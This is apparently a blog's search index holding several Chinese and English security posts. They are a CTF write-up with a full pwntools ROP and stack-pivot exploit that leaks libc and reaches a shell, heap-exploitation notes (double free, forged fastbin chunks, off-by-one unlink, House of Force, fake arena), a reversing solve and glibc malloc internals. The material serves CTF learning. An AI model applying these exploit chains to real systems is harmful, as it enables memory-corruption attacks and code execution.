<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Shanghai-DCTF-2017-pwn]]></title>
    <url>%2F2017%2F11%2F30%2FShanghai-DCTF-2017-pwn%2F</url>
    <content type="text"><![CDATA[#Shanghai-DCTF-2017-pwn 简单分析简单说一说程序漏洞不少，但是因为编译时加入的保护措施，导致大多数漏洞无法利用。比赛时一直惯性思维，认为有canary的函数就不会成功利用栈溢出进行攻击。回头才发现一个点，也算是一个比较少见的知识点，可以绕过canary的防护，从而对程序流程进行控制。 程序流程flex_md5、flex_sha256、flex_sha1、在test security这个选项中有堆溢出、栈溢出、格式化字符串漏洞但是格式化字符串漏洞中的格式化串不可控栈溢出虽然是结构化的写入，但是还是绕不过canary堆溢出这里是一次溢出无返回，没能找到什么方法能够控制ip 漏洞代码在401148这个函数处，有一个整型下溢输入的int会加1后转为unsigned int在读取charset时，buf在栈上，因此可以造成栈溢出没有局部变量可以覆盖，且有canary保护 c++ 异常处理机制 (Modern cpp)异常抛出使用throw语句可以在代码块中的任何地方抛出异常。throw语句的操作数决定了异常的类型，可以是任何表达式，表达式结果的类型决定了抛出异常的类型。 异常抓取try块后面的catch块捕获任何异常。可以指定要捕获的异常类型，并且由关键字catch之后的括号中的异常声明确定。12345try &#123; // protected code&#125; catch( ExceptionName e ) &#123; // code to handle ExceptionName exception&#125; 例子123456789101112131415161718192021222324#include &lt;iostream&gt;using namespace std;double division(int a, int b) &#123; if( b == 0 ) &#123; throw "Division by zero condition!"; &#125; return (a/b);&#125;int main () &#123; int x = 50; int y = 0; double z = 0; try &#123; z = division(x, y); cout &lt;&lt; z &lt;&lt; endl; &#125; catch (const char* msg) &#123; cerr &lt;&lt; msg &lt;&lt; endl; &#125; return 0;&#125; g++进行编译，在main函数处出现了异常抓取模块在division函数处出现了异常抛出模块 关键点异常抛出后程序会如何执行呢？ 异常空间申请 异常抛出 异常抓取caller(main)中抓取异常__cxa_begin_catch异常处理结束跳转到函数返回关键在于，此时的栈从哪里获得？是异常抛出函数division()的栈么，还是main()的栈？可以看到，这时的栈是main()的栈 但是main()的rbp寄存器从哪里获得？是在异常抛出函数__cxa_throw()中从division()的栈获得的。 但是，当栈已经发生溢出了呢？答案是，它不管！ 开始日题整型溢出–&gt;栈溢出–&gt;异常处理–&gt;stack_pivot–&gt;ROPBUG_401148()异常抛出flex_md5()异常处理 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *io=process("./pwn")context.arch = "x86_86"context.os = "linux"context.endian = "little"context.word_size = 64context.terminal = ['deepin-terminal','-x','sh','-c']libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')io.recvuntil("option:\n")io.sendline("1")print io.readline()io.sendline("No")io.sendline("yes")print io.recvuntil("length:")#gdb.attach(io)io.sendline('-2')print io.recvuntil("charset:")BSS_PIVOT=0x6061C0 payload1=p64(BSS_PIVOT)*37+p64(0x40150D)#overwrite stack ebp --&gt; stack_pivot#gdb.attach(io)#pause()io.sendline(payload1)#gdb.attach(io)#pause()print io.recvuntil("\n")puts_plt=0x400BD0puts_got=0x606020readn=0x400F1E pop_rdi=0x4044d3pop_rsi_r15=0x4044d1 #gdb.attach(io)payload2 = p64(0)+p64(pop_rdi)+p64(puts_got) + p64(puts_plt) + p64(pop_rdi)+p64(BSS_PIVOT+0x50)+p64(pop_rsi_r15)+p64(1024)+p64(BSS_PIVOT+0x50)+p64(readn)# puts(put@got) -&gt; readn_0x400f1e( stack_pivot + 0x50, 1024 ) one_gadget_addr to ret -&gt; one_gadget#write pivot stack#pause()io.send(payload2)io.recvuntil("pattern:\n")puts=io.recvuntil("\n")[:-1]puts=puts.ljust(8,"\x00")puts=u64(puts)libc_base=puts-libc.symbols['puts']print "libc_base-&gt;",hex(libc_base)one_gadget=libc_base+0xd691fpayload3=p64(one_gadget)gdb.attach(io)pause()io.send(payload3) #one_gadget_addr send to stack ret#due to that the exception_handling program is define in func flex_md5_401500, faked ebp_save will be poped to ebp, when exception_handling program finishes, ip will be set to 'leave retn' so we can control ip and stack(stack pivot in bss) than leak and exec.io.interactive()]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>STACK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heap-Exploitation-EXP]]></title>
    <url>%2F2017%2F10%2F27%2FHeap-Exploitation-EXP%2F</url>
    <content type="text"><![CDATA[Heap-ExploitationPreview Double Free Making malloc return an already allocated fastchunk Forging chunks Making malloc return a nearly arbitrary pointer Unlink Explit Getting (nearly) arbitrary write access OFF-BY-ONE Depending on the one-byte-overflow House of Spirit Making malloc return a nearly arbitrary pointer House of Lore Making malloc return a nearly arbitrary pointer House of Force Making malloc return a nearly arbitrary pointer House of Einherjar Making malloc return a nearly arbitrary pointer First-Fitnormal bins Whenever any chunk (not a fastchunk) is free()’d, it ends up in the unsorted bin. Insertion happens at the HEAD of the list. On requesting new chunks (not fast chunk), initially unsorted bins will be looked up as small bins will be empty. If a single chunk is present in the unsorted bin, an exact check is not made and if the chunk’s &gt;= the one requested, it will be splited inti two and the chunk of requested size will be returned. ExampleStep1123char* a = malloc(512);char* b = malloc(256);char* c; Step21free(a); Step31c = malloc(250); fastbins This is also true in the case of fast chunks. Instead of freeing into unsorted bin, fastchunks end up in fastbins . As mentioned earlier, fastbins maintain a singly linked listand chunks are inserted and deleted from the HEAD end. This reverses the order of chunksobtained. ExampleStep 11234char *a = malloc(20); // 0xe4b010char *b = malloc(20); // 0xe4b030char *c = malloc(20); // 0xe4b050char *d = malloc(20); // 0xe4b070 fastbins list HEAD -&gt; TAIL Step 21234free(a);free(b);free(c);free(d); fastbins list HEAD -&gt; d -&gt; c -&gt; b -&gt; a -&gt; TAIL Step 312a = malloc(20); // 0xe4b070b = malloc(20); // 0xe4b050 fastbins list HEAD -&gt; b -&gt; a -&gt; TAIL Step 412c = malloc(20); // 0xe4b030d = malloc(20); // 0xe4b010 fastbins list HEAD -&gt; TAIL PS: Due to that Insertions happen at HEAD and removals happen at HEAD as wella’ == db’ == cc’ == bd’ == a Use after Free Vulnerability malloc might return chunks that were ealier used and free()’d. Once a chunk has been free()’d, it should be assumed that the attacker can now control the data inside the chunk. That particular chunk should never be used again. Instead, always allocate a new chunk. Example123456789101112char *ch = malloc(20);/* ......*/free(ch);/* ......*/if(*ch == a)&#123; //do what&#125; Double Free Freeing a resource more than can lead to memory leaks. The allocator’s data structures get corrupted and can be exploited by an attacker. In the sample program below, a fastbin chunk will be free()’d twice. To avoid double free or corruption (faststop) security check by glibc, another chunk will be free()’d in between the two free()s. The same chunk will be returned by two different malloc. Both the pointers will point to the same memory address. Attacker can change the chunk by using any pointer of these two. ExampleStep 11234//fastbinsa = malloc(10); //0xa04010b = malloc(10); //0xa04030c = malloc(10); //0xa04050 Step 2123free(a);free(b);free(a); //Double Free Here. Step 3123d = malloc(10); //0xa04010e = malloc(10); //0xa04030f = malooc(10); //0xa04010 ExploitArbitrary Write Change bytes of malloc()d d to change FD to address of faked fastbin. free() d, so f-&gt;FD == &amp;faked fastbin free() f, so faked fastbin will be in fastbins list of this size. malloc() for the same type of size fastbin chunk, we can control faked chunk mem. Leak Address free() d, so f-&gt;FD will be set by glibc puts(f), so we get f-&gt;FD as a address of a fastbin in HEAP Forging chchunks After a chunk is freed, it is inserted in a list of bins. However the pointer is still available in the program. Attacker may use the pointer to control the list of bins and insert his own forged chunk into this list. ExampleIn the case of fastbin freelist 123456789101112131415161718192021222324252627282930313233struct forged_chunk&#123; size_t prev_size; size_t size; struct forged_chunk *fd; struct forged_chunk *bk; char buf[10];&#125;;a = malloc(10);//malloc a chunkstruct forged_chunk chunk;chunk.size = 0x20;data = (char *)&amp;chunk.fd;//when a chunk is in use, malloc() return address is equal to &amp;chunk.fd after it is free()'d//fastbin is a single-list and is linked only by chunk.fdstrcpy(data, "attacker's data");free(a); // HEAD--&gt;a--&gt;TAIL//when a chunk is free()'d, &amp;chunk.fd is equal to the chunk's malloc() return when it is malloc()'d//overwrite a.fd by the pointer to our fake chunk*((unsigned long long *)a) = (unsigned long long)&amp;chunk. //HEAD--&gt;a--&gt;forged_chunk--&gt;forged_chunk.fd(UNDEFINED)--&gt;....//when **a** is malloc()'d again, the first chunk to malloc() will be a.fd( our fake chunk)malloc(a);//next malloc() will return our faked chunkvictim = malloc(10);//victim's data is the data of our fake chunk (forge_chunk)puts(victim); The forged chunk’s size parameter was set equal to 0x20 (which is the size of a), so it can be inserted into the same fastbin_list of this size (So that it passes the security check “malloc(): memory corruption (fast)”). malloc() return is equal to chunk.fd when it is free()’d Unlink Exploithttp://blog.flier.net.cn/2017/10/16/unlink/ OFF-BY-ONEThis kind of EXP makes use of the one-byte-heap-overflow What is off-by-one heap overflow When (P-&gt;SIZE &amp; 0x1) == 1 (P-&gt;PREV_INUSE == 1), P-&gt;PREV_SIZE may be used by the previous chunk as data. However, if P-&gt;PREV_INUSE == 0, P-&gt;PREV_SIZE will be used in UNLINK. malloc() a chunk whose size is special. Then we call strcpy(a string which size == 124) (etc. ), we can overflow PREV_INUSE to 0. ExampleStep 1We get two chunks, and the chunk_2 can be off-by-one attacked. 12get_a_box(2,0x100 - 0x8)get_a_box(3,0x180) Step 2Make a buf consisting of a fake chunk header and some “A” and a lowest byte of next_chunk-&gt;SIZE. 12345message_small = p64(0) + p64(0x100 - 0x10 + 0x1) + fake_fd + fake_bkmessage_small = message_small.ljust(0x100 - 0x10,"A")message_small += p64(0x100 - 0x10)message_small += "\x90"leave_me_a_message(2,message_small) Step 3free() chunk_3 to unlink our fake chunk header 1destory_a_box(3) OverviewBEFORE FREE AFTER FREE ( UNLINK ) EXP Use the overwrited malloc_return_ptr (which now points to &amp;ptr - 3 now) to overwrite near malloc reutrn ptrs to GOT table. Use the overwrited ptrs to overwrite GOT free(a) —–&gt; system(a) , etc. to be continue ……]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HEAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CCF2016-reverse2]]></title>
    <url>%2F2017%2F10%2F27%2FCCF2016-reverse2%2F</url>
    <content type="text"><![CDATA[CCF2016 软件破解2分析 此处代码段有无法解析的指令 程序在输入密码后，用输入的密码作为argv[1]，以原程序的path作为argv[0]开启了新的子线程 此处向子线程写入了一些数据 观察其参数，写入子线程的目标目标地址为 直接手动patch 反编译后观察加密 与wlcome to CFF te异或后加1 结果与之比对 Decode123456789101112xor_str="elcome to CFF te"aim_str = "\x25\x5c\x5c\x2b\x2f\x5d\x19\x36\x2c\x64\x72\x76\x80\x66\x4e\x52"flag = ""print len(xor_str),len(aim_str)for x in range(0,len(xor_str)): flag += chr(ord(xor_str[x]) ^ ord(aim_str[x]) - 1)print flag]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>REVERSE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heap-Exploitation-base-knowledge-notes]]></title>
    <url>%2F2017%2F10%2F24%2FHeap-Exploitation-base-knowledge-notes%2F</url>
    <content type="text"><![CDATA[Heap ExploitationBase Knowledgemalloc_chunk1234567891011struct malloc_chunk&#123; INTERNAL_SIZE_T mchunk_prev_size; /*Size of previous chunk (if free) */ INTERNAL_SIZE_T mchunk_size; /*Size in bytes, including overhead */ struct malloc_chunk* fd; /*double links ---- used only if free.*/ struct malloc_chunk* bf; /*only used for large blocks: pointer to next larger size*/ struct malloc_chunk* fd_nextsize; struct malloc_chunk* bk_nextsize;&#125;typedef struct malloc_chunk* mchunkptr; Allocated chunk mem is the pointer which is returned to the user. Free chunk Free chunks maintain themselves in a circular doubly linked list. P(PREV_INUSE): 0 when previous chunk (not the prev chunk in the linked list, but the one directly before it in memory) is free (and hence the size of previous chunk is stored in the first field). The very first chunk allocated has this bit set. If the bit set to 1, we cannot determine the size of the previous chunk. M(IS_MMAPPED): The chunk is obtained through mmap. The other two bits are ignored. mmapped chunks are neither in an arena, not adjacent to a free chunk. A(NON_MAIN_ARENA): 0 for chunks in the main arena. Each thread spawned received its own arena and for those chunks, this bit is set. PS: fastbins are not included in the set described above. malloc_stateThis structure represents the details of an Arena. The main threads arena is a global variable and not part of the heap segment.Arena headers( malloc_chunk structures) for other threads are themselves stored in the heap segment. Non main arena can have multiple heaps associated with them. 123456789101112131415161718192021222324252627struct malloc_state &#123; __libc_lock_define (, mutex); int flags; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bin[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena,c, */ struct malloc_state *next_free; /* Number of threands attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;typedef struct malloc_state *mstate; Bins and ChunksA bin is a list (doubly or singly linked list) of free (non-allocated) chunks. Bins are differentiated based on the size of chunks they contain: Fastbin Unsorted bin Small bin Large bin PS: Unsorted, small and large bins are maintained using a single array:12typedef struct malloc_chunk * mchunkptr;mchunkptr bins[]; //Array of pointers to chunks FastbinsThe 10 types of fastbins each have chunks of size: 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88. Sizes mentioned here include metadata as well. To store chunks, 4 fewer bytes will be available (on a platform where pointers use 4 bytes). Only prev_size and size field of this chunk will hold meta data for allocated chunks. PS: No two contiguous free fast chunks coalesce together, which is not different with normal bins. Unsorted binThere is only 1 unsorted bin. Small and large chunks, when freed, end up in this bin. The primary purpose of this bin is to act as a cache layer to speed up allocation and deallocation requests. Small binsEach small bin maintains a doubly-linked list. Insertions happen at “HEAD” while removals happen at the ‘TAIL’(in a FIFO manner).The 64 bins have sizes: 16, 24, …… 504 bytes. PS: While freeing, small chunks may be coalesced toghether before ending up in unsorted bins. Large binsEach large bin maintains a doubly-linked list. A particular chunks of different sizes, sorted in decreasing order. Insertions and removal happed at any position within the list. The first 32 bins contain chunks which are 64 bytes apart: 1st bin: 512 - 568 bytes2nd bin: 576 - 632 bytes…… Top chunkIt is the chunk which borders the top of an arena. While servicing ‘malloc’ requests, it is used as the last resort. If still more size is required, it can grow using the sbrk system call. The PREV_INUSE flag is always set for the top chunk. Last remainder chunkIt is the chunk obtained from the last split. Sometimes, when exact size chunks are not available, bigger chunks are split into two. One part is returned to user whereas the other becomes the last remainder chunk. Internal functionsarena_get(ar_ptr, size)Acquires an arena and locks the corresponding mutex. ar_ptr is set to the pointer to the corresponding arena. size is set to how much memory will be required immediately. sysmalloc [TODO]sysmalloc handles malloc cases requiring more memory from the system.On entry, it is assumed that assumed that av->top does not have enough space to service request for nb bytes, thus requiring that av->top be extended or replaced. void alloc_perturb(char *p, size_t n)If perturb_byte (tunable parameter for malloc using M_PERTURB) is non-zero (by default it is 0), sets the n bytes pointed to by p to be equal to perturb_byte ^ 0xff. 调用alloc_perturb对用户使用的内存进行初始化，之后就会返回该内存的指针（在_int_malloc(mstate av, size_t bytes)函数中) void free_perturb(char *p, size_t n)If perturb_byte (tunable parameter for malloc using M_PERTURB) is non-zero (by default it is 0), sets the n bytes pointed to by p to be equal to perturb_byte. void malloc_init_state(mstate av) For non fast bins, create empty circular linked lists for each bin. Set FASTCHUNKS_BIT flag for av. Initialize av-&gt;top to the first unsorted chunk. unlink(AV, P, BK, FD)This is a defined macro which removes a chunk from a bin. Check if chunk size is equal to the previous size set in the next chunk. Check if P-&gt;fd-&gt;bk == P and P-&gt;bk-&gt;fd == P. Adjust forward and backward pointers of neighboring chunks (in list) to facilitate remova: Set P->fd->bk = P->bk Set P->bk->fd = P->fd void malloc_consolidate(master av)This is a specialized version of free(). malloc_consolidate函数主要完成以下几个功能： 首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins，再初始化fast bins。]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>PWN</tag>
        <tag>HEAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PLAY_WITH_LINUX_HEAP-notes]]></title>
    <url>%2F2017%2F10%2F21%2FPLAY-WITH-LINUX-HEAP-notes%2F</url>
    <content type="text"><![CDATA[PLAY WITH LINUX HEAP作者:memeda@0opspwner.xu@gamil.con BACKGROUND Linux heap become hard to exploit due to the new version of GLIBC. Hundreds of thousands of assertions there. ASLR and Non-eXecutable heap. Heap issues are scarce in CTF games. spring up in recent games like HOTCON CTF &amp; Hack.LU CTF. CATALOGUE Introduction to GLIBC Heap View Heap As an Attacker free() malloc() main_arena mmap() &amp; munmap() Examples Introduction to GLIBC HeapGLIBC Heap Structure chunk头包括以下两部分：prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，用于指示前一chunk是否已被使用( PREV_INUSE )。如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：fd: 下一个未被使用的chunk的地址bk: 上一个未被使用的chunk的地址可以看到，chunk头中包含的大小信息，主要用来在获取内存中相邻chunk的地址（当前chunk地址减去前一chunk的大小，为前一chunk的地址；当前chunk地址加上当前chunk的大小，为后一chunk的地址）。而mem中的fd和bk只在当前chunk处于未被使用时才有意义。如果了解数据结构，便可以立刻看出，这些未被使用的chunks通过fd, bk组成了链表。事实上，malloc确实维护了一系列链表用于内存的分配和回收，这些链表被成为”bins”。一般来说，每个bin链表中的chunk都有相同或将近的大小。根据bin所包含chunk的大小，可以将bin分为fastbin, unsorted bin, small bin, large bin。 the range of a chunk is between LABEL Chunk and LABEL Next Chunk PREV_SIZE represents the size of the previous chunk(in memory) only if the previos chunk is free()’d. SIZE represents the number of bytes between LABEL Chunk and LABEL Next Chunk. If the lowest bit of SIZE is cleared as 0, then the chunk before it is not in use(free). LABEL Mem makes sense only when this chunk is malloc()’d by user. &amp;Mem is considered as the return value of malloc(). For chunks of certain size range, there is a free list which is a linked list. FD represents the forward pointer to the next chunk in the linked list. BK represents the backward pointer to the previous chunk in the linked list. The above two fields only make sense when the chunk is free()’d User’s data is stored in the region which starts at LABEL Mem. Notice that the region includes PREV_SIZE of the next chunk. View Heap as an Attacker — free()CORRUPT FREE 1 Let’s begin at function free() but not malloc(). In the old version of GLIBC, there is a classical exploition of heap overflow with free(). PROTOSTAR HEAP 3 In old version of GLIBC malloc, there is function called unlink(): If BK and FD is controlled by us, then (in Linux x86) *(FD + 12) = BK &amp;&amp; *(BK + 8) = FD AN ARBITRARY WRITE! Then the problem comes, why unlink() is called when 3 free()s called? Since free() means linking the chunk into the free list. THE ANSWER is when GLIBC free a chunk, it will go to see whether the chunk before/after is free. If it is, then the chunk before/after will be unlink()’d off its double-linked list and these two chunks merge into one chunk. So for this problem, you can overflow chunk a and overwrite the heap header of chunk b. If you set the lowest bit of SIZE of b to 0, then GLIBC fooled to consider chunk a free()’d. Then unlink() is called on chunk a. SIZE represents the number of bytes between LABEL Chunk and LABEL Next Chunk. If the lowest bit of SIZE is cleared as 0, then the chunk before it is not in use(free). You can also set PREV_SIZE f chunk b to fool GLIBC where the chunk b begins. Craft a fake chunk b there and get an arbitrary wirte. MODERN UNLINK New checking: FD-&gt;bk \== P &amp;&amp; BK-&gt;fd \== P CORRUPT FREE 2 Let us have a look at Problem stkof from HITCON CTF 2014. Pwnable worth 550 points. It is still available on httpL//ctf2014.hitcon.org/dashboard.html. The scenario is simple: You can give a size and malloc a chunk of the size. There is global arrary which records the pointer of every chunk you malloc()’d. You can write arbitrary long content into the pointer in the global array. You can free any of the chunk you malloc()’d before. There is a global variable record the times you malloc()’d. PWNABLE PROBLEM STKOF In this scenario, there is a variable counting how much chunk you’ve malloc()’d. Here it is 3 at 0x602100. 3 chunk’s pointer are stored in a global arrary at 0x602140, which is 0xe05010, 0xe05040 and 0xe050d0(Remember is is what we called LABEL Mem). We can also writing anything long into the data area these pointers pointing to. CORRUPT FREE 2 Heap Overflow with free()’ called, everything is nice except that FD-&gt;bk ?= P BK-&gt;fd ?= P When facing this, the MOST IMPORTANT thing is that find somewhere in the memory in which the value is P. PS: Geohot’s futex exploit trick(0x00bf0000) to bypass plist checking in Android Kernel. In this problem, there is a global arrary which stores all the pointer pointing to all the chunk. Notice that this pointer is pointing to LABEL &amp;Mem but not that start of the chunk! So we need to craft a fake chunk at &amp;Mem. That is not very difficult because we have heap overflow whcih means the whole control of the content of the chunk on the heap. Another restriction shown in the code before is the if clause. Just set P-&gt;fd_nextsize to NULL then skip if. EXP from acez@Shellphish http://github.com/acama/ctf-writeups/blob/master/hitcon2014/stkof/x.py As you can see, the exploit overwrite chunk 3, place a fake chunk at the location of chunk 4. The fake heap header of chunk 4 fool GLIBC to believe that chunk before chunk 4 is chunk 2. There is a fake chunk 2 at chunk 2’Mem. Notice that 0x602150 is the pointer in the global array which pointing to chunk 2’s Mem(key point here to bypass the chunk!). Call free(4) to unlink fake chunk2. Then after unlink, an address in the range of &amp;global_arrary itself is written into the global arrary. That means we can rewrite the content of the global arrary directly. If we control the global array, then wen can control which pointer we can write into. This is a case about heap overflow where SPECIFIC WRITE turns into ARBITRARY WRITE！ Always keep in mind When malloc() returns, it gives you the pointer pointing to LABEL Mem. When processing some stuff in malloc.c, the pointer of a chunk(whose type is struct malloc_chunk * ) is pointing to LABEL Chunk. POISINED NULL BYTE In August Zero released a post about a GLIBC NULL byte off-by-one exploitation. The null byte will clear all the status bits of the SIZE of the next chunk. The PREV_SIZE is actually the user data of the chunk but now it will used to locate the chunk The exploit decribed in the post is a local unprivilrge exploit with Linux 32bit, which means we could half-disable ASLR and things become easy. The exploit regerred in the post used fd\nextsize and bk-nextsize to do the arbitrary write which is also a way besides directly use fd and bk. P-&gt;fd_nextsize should not be NULL. FD-&gt;fd_nextsize should not be NULL. However, the target in the post is Fedora where that two aserts do not exist. When it comes to Ubuntu, Fail. View Heap as an Attacker — malloc()CHEAT MALLOC 1 free()’d chunks which has a size in certain range will be put into one free list. The head of the free list is in main_arena which will be covered later. The basic idea of the section is to CHEAT GLIBC to malloc the chunk to the special place you want to. Then you can write to that heap chunk, which means that you write to that special place. If there are some important pointers or data structures at that special place, then it is easy to finish the exploit then. begin with an easy example – fastbin When the chunk’s size is small enough, GLIBC called it fastbin. Different sizes of fastbins also have their free list, but this time it is a single-linked list. The single-linked list makes things much easier. This picture shows two fastbins in the free list which both have a size of 0x30. Single-linked list header 0x7fff7bd1770 pointing to Chunk 0x00e05090.Chunk 0x00e05090’s FD pointing to Chunk 0x00e05030.Chunk 0x00e05030’s FD is NULL, the end of this linked list. How does GLIBC work when malloc()ing a fastbin? It just mainly pick out the first (-&gt;fd) fastbin in the linked list, and return it to the user. That meas if we control just one node of this linked list, then we can cheat GLIBC to malloc the chunk where specified by us. maclloc two fastbins. Free the 2nd fastbin. Overflow the 1st fastbin to change 2nd fastbin’s FD to our specified value. Malloc one time. GLIBC return the 2nd fastbin to us, meanwhile the header of the single-linked list points to our specified value. The value points to a fake fastbin entry we crafted already. Malloc anather time. Then just write into the new chunk which birth at the specified place you want to and finish your exploit. EASY to exploit since single-linked list is less troublesome, comparing with double-linked list with countless security check with normal bins in the new version of GLIBC malloc.c. The only check for the fastbin entr in the list is the SIZE! Craft a proper size for the fake fastbin entry. Recall the problem STKOF, where the fakebin could be? There is a counting variable at 0x602100, just add it up to a proper value and it somehow could pretend to be SIZE right?(the fake chunk at 0x602100 - 0x8) If you can free any where you want, then just free the place you could write(craft) directly. You don’t necessarily need to work on the heap and do the overflow. Or if you can overwrite the malloc()’d pointer to a specia=fy value and then free it, also take the same effect. This scenario is mentioned in phrack Malloc_Des-Maleficarum. CHEAT MALLOC 2Whether malloc() with normal bins and double-linked can be cheated I malloc 7 chunks with normal size and free 3 of them. As you can see, they are both in one double-linked list. Then I do malloc(0x212). As you can see, strange things happen. Now two double-linked lists there. In fact, double-linked list(0x7ffff7bd17b8) is called the unsorted bin’s free list. double-linked list(0x7ffff7bd19b8) is the real list for the real free list for the chunk with size 0x210. At first, all the free()’d chunks are put in to unsorted bin list. When alloc() comes, GLIBC travels from the BK of the header of the unsortd bin list. If the size is fit, then unlink this chunk and return to the user. If not, put this chunk into its free list according to its size. I am going to give an illustration about exploiting this. Overflow Chunk 0xe05210 to change 0xe05630’s BK to an address which points to a craft heap chunk. The chunk has a right SIZE(0x211).] As you can see, after I malloc(0x212), the header of the unsort bin list’s BK points to my fake chunk at 0xe10000. A very important thing is that during the process shown before, there is NO CHECKING like P-&gt;FD-&gt;BK == P AND so on. And after this, you are able to cheat GLIBC to malloc at the place you want(int this case 0xe10000). But during this, Chunk 0xe10000 will be unlinked so make sure its BK-&gt;FD points to 0xe10000 this time. For this case, I just bring out my ideas. Let me know if you have other nice ways to exploit it. CHEAT MALLOC 3 There is another important concept called wilderness or the top chunk. In a word, if there is no proper chunk in the free list, then GLIBC will splice a certain size out of the top chunk and then return it to ther user. That means the top chunk usually has a large SIZE and be located at the bottom of the heap (behind all the normal heao chunks). Malloc_DES-Maleficarum also described a trick which cheats malloc by using the top chunk. You can use overflow to change the SIZE of the top chunk to 0xffffffff(Linux x86). Then you just malloc, and if the control flow goes into use_top, then actually you can malloc whatever large size you want. You can craft a special size s. Then after malloc()ing, the top chunk’s address will change to the original address plus s. In fact, we can specify any new address we want by specifying s. If we malloc again, then we could get a chunk at the special place we want. This trick may not make sense when meet ASLR since at most time the location of the top chunk cannot be predicted. View Heap as an Attacker — main_arena / predict heap chunk’s location despite ASLRMAIN_ARENA It’s time for us back to the most basic and important structure main_arena. Hack the core then we control all. main_arena is defined as below(Linux x86_64) It is a structure of type malloc_state and size is 0x888. Array fastbinY The Value in each entry represents the head of (single-linked) free list of the fastbins whcih has a size in certain range. Top It is the top-most chunk. When there is no good target chunk for a new malloc request in these free lists, it is used.(label use_top in function _int_malloc) Array bins Heads of all the (double-linked) free list of different size ranges. next Pointing to the next arena. system_mem Memory allocated from the system in this arena. FAKE MAIN_ARENA A POINTER pointing to arena structure is near TLS. How to use heap overflow to rewrite it? I’ll talk about it later. Now, let us have a discussion on how to do an exploitation when we could specify the arena which we can fully controlled. The main idea is to specify the head of the linked list in the arena, and then cheat GLIBC to malloc a new chunk at that specified place we prefer. But thing are not very easy. The specified place(the fake chunk) must satisfy many conditions, otherwise malloc will go to failure. FIGHTING WITH ASSERTIONS Let us trace back the source. Before _libc_malloc exit, there is an assert on victim, the chunk which is going to return to you. If victim == NULL, just don’t care this If the chunk is labelled mmapped a chunk is mmapped when its SIZE has 0x2 bit set. If ar_ptr == victim’s arena ptr Due to the faked arena we crafted, chunk_non_main_arena will return true. If the SIZE has 0x4 bit set, it means NON_MAIN_ARENA. And it is very hard to control the value which address (ptr &amp; ~(HEAP_MAX_SIZE - 1)) pointing to. It is very hard to control on Linux x86_64. If ptr is not big enough, it will cause NULL pointer dereference. So in a word, the best choice is to satisfy [2] and then bypass this assert. BTW Actually when we call free(p), it weill call arena_for_chunk(p) to get the arena of the chunk. What if we use heap overflow to set a chunk’s NON_MAIN_ARENA bit? it will then try (ptr &amp; ~(HEAP_MAX_SIZE - 1))-&gt;ar_ptr to get the arena pointer… That may cause problems, which is mentioned in phrack Malloc_Des-Maleficarum. To satisfy [2], you faked chunk’s SIZE should have 0x2 bit (mmapped). If you deep into _int_malloc, you will find out that sometimes before it return p; to exit, it will finally reset the head of the chunk which it will then return to you, which means you’ll lose the 0x2 bit. We do not hope that happeds. 3 scenarios where the head of our crafted chunk wont’t be reset fastbin size range; corresponding small bin’s free list is not empty; a free()’d candidate chunk in unsort bin free list and the size of free()’d candidate chunk in the free list is exactly the same as our crafted chunk’s size. Again,fastbin becomes our first choice, since we must deal witg FD and BK when use whether normal small bin or normal large bin. [1] A crafted chunk you want to malloc on which has a proper SIZE(0x2 bit set). Remember an non-NULL illegal FD of this chunk will not make a crash during this malloc() but will bring a side effect in the furture. [2] The entry of fastbinY’s free list should be set to the address of your crafted chunk.(&amp;SIZE - 0x8 on Linux x86_64). A FAKE ARENA EXAMPLEyou do not need to specify the whole 0x888 bytes. For example, if you use fast bin to exploit, you may must specify the first several bytes. DEFEAT ASLR Where is the problem of main_arena? How could we touch it? If the size you want to malloc is not less than 128KB, then GLIBC may use mmap() to allocate a new area for you. There are many gaps in the program’s VM map, and GLIBC will use these large gaps to satisfy your malloc request. main_arena is in the marked area(TLS is there), and if we can malloc a chunk before this arena nad overflow it, then we can overwrite main_arena. Although the existence of ASLR, I would like to say that it is possible to know it is possible to know it is the time I malloc()’d just before TLS. In fact, the location of the chunk you malloc()’d could be predicted even on Linux x86_64. Consider a program(stkof) which doesn’t have any chunk malloc90d before the user’s input comes. [1] Then I try to malloc(2147483648) as many times as possible. [2] And then I malloc(135168).The chunk will be located just before TLS. I will fill it with As to give an illustration. Note that all the malloc()s in [1] &amp; [2] will actually call mmap(). The chunk just before arena is located at 0x7f0313248010. And with no surprise, the pointer of arena is at 0x7f031326a700. So, it is able to overflow it for sure. Btw, the stack canary is at 0x7f031326a768. Before the pointer of the arena, there are some values. Actually most of these values can just be overwritten to 0x0 except the first entry(which is located at 0x7f031326a690 in the previous picture). Its symbol is _nl_global_lacale. And is used in ____strtoll_I_internal. We should put an 